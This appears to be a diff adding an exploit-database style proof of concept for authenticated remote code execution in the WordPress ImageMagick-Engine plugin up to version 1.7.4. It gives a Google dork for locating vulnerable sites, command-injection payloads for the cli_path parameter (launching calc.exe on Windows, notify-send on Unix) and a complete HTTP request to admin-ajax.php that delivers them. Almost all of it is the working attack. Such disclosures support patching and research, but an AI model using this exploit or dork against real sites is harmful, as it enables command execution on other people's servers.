@@ -1,0 +1,33 @@
+# Exploit Title: Wordpress Plugin ImageMagick-Engine 1.7.4 - Remote Code Execution (RCE) (Authenticated)
+# Google Dork: inurl:"/wp-content/plugins/imagemagick-engine/"
+# Date: Thursday, September 1, 2022
+# Exploit Author: ABDO10
+# Vendor Homepage: https://wordpress.org/plugins/imagemagick-engine/
+# Software Link: https://github.com/orangelabweb/imagemagick-engine/
+# Version: <= 1.7.4
+# Tested on: windows 10
+
+-- vulnerable section
+https://github.com/orangelabweb/imagemagick-engine/commit/73c1d837e0a23870e99d5d1470bd328f8b2cbcd4#diff-83bcdfbbb7b8eaad54df4418757063ad8ce7f692f189fdce2f86b2fe0bcc0a4dR529
+
+-- payload on windows: d&calc.exe&anything
+-- on unix : notify-send "done"
+-- exploit :
+
+GET /wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=[payload]
+HTTP/1.1
+Host: localhost
+Cookie: wordpress_sec_xx=; wp-settings-time-1=;
+wordpress_test_cookie=; wordpress_logged_in_xx=somestuff
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0)
+Gecko/20100101 Firefox/104.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://localhost/wp/wordpress/wp-admin/options-general.php?page=imagemagick-engine
+X-Requested-With: XMLHttpRequest
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Connection: close
